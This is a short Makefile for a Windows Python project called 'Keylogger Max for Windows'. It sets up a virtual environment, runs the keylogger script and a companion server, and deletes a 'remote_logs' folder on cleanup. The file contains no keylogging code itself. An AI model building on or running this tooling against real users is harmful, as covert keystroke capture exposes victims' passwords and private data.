VENV_DIR = venv
PYTHON = $(VENV_DIR)/Scripts/python.exe
PIP = $(VENV_DIR)/Scripts/pip.exe

.PHONY: all install run_keylogger run_server clean

all: install run_server

install:
	@echo "Setting up virtual environment and installing dependencies..."
	python -m venv $(VENV_DIR)
	$(PIP) install -r requirements.txt
	@echo "Installation complete."

run_keylogger:
	@echo "Starting Keylogger Max for Windows... (Press Ctrl+C to stop)"
	$(PYTHON) keyloggermax.py

run_server:
	@echo "Starting server..."
	$(PYTHON) server.py

clean:
	@echo "Cleaning up generated files and virtual environment..."
	rm -rf $(VENV_DIR)
	rm -rf remote_logs
	@echo "Cleanup complete."